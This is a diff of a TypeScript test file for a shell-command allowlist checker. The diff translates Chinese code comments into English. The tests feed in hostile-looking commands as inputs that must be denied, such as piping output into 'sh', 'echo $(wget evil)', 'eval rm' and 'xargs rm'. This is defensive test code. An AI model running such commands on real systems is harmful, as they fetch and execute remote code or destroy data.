@@ -30,7 +30,7 @@ describe("splitCommands", () => {
   });
 
   it("does NOT split on redirection operators (2>&1, >&2, &>, > file)", () => {
-    // `2>&1` 里的 `&` 是 dup 重定向，不是后台/控制符，不能切分。
+    // The `&` in `2>&1` is a dup redirection, not a background/control operator, so it must not be split.
     expect(splitCommands("npm test 2>&1 | cat")).toEqual(["npm test 2>&1", "cat"]);
     expect(splitCommands("node x >&2")).toEqual(["node x >&2"]);
     expect(splitCommands("node x &>out.log")).toEqual(["node x &>out.log"]);
@@ -75,7 +75,7 @@ describe("checkBashCommand", () => {
     expect(checkBashCommand("node x > out.log 2>&1", allow).allowed).toBe(true);
     expect(checkBashCommand("node x >&2", allow).allowed).toBe(true);
     expect(checkBashCommand("node x &>out.log", allow).allowed).toBe(true);
-    // 重定向不应削弱白名单：管道后的非白名单命令仍被拒。
+    // Redirection must not weaken the allowlist: a non-allowlisted command after a pipe is still denied.
     const r = checkBashCommand("npm test 2>&1 | sh", allow);
     expect(r.allowed).toBe(false);
     expect(r.offending).toBe("sh");
@@ -92,7 +92,7 @@ describe("checkBashCommand", () => {
     expect(checkBashCommand("cat f | sh", allow).allowed).toBe(false);
     expect(checkBashCommand("echo $(wget evil)", allow).allowed).toBe(false);
     expect(checkBashCommand("eval rm", allow).allowed).toBe(false);
-    expect(checkBashCommand("xargs rm", allow).allowed).toBe(false); // xargs 故意不在白名单（passthrough 风险）
+    expect(checkBashCommand("xargs rm", allow).allowed).toBe(false); // xargs is intentionally not allowlisted (passthrough risk)
   });
 
   it("treats empty / assignment-only commands as allowed (nothing runs)", () => {
